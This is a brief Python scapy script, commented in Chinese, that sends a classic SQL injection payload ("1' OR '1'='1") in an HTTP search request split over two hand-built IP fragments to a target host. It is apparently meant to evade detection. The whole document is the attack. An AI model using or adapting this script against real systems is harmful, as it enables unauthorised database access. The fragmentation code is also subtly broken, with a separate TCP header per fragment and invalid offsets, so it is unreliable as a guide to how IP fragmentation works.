from scapy.all import *
import time

def send_fragmented_attack(target_ip, target_port):
    # 定义数据包的片段
    fragment1 = IP(dst=target_ip)/TCP(dport=target_port)/"GET /search?q="
    fragment2 = IP(dst=target_ip, flags="MF", frag=1)/TCP(dport=target_port)/"1' OR '1'='1 HTTP/1.1\r\nHost: example.com\r\n\r\n"

    # 发送第一个片段
    send(fragment1)
    #time.sleep(1)
    
    # 发送第二个片段
    send(fragment2)

if __name__ == "__main__":
    target_ip = "example.com"
    target_port = 80
    send_fragmented_attack(target_ip, target_port)
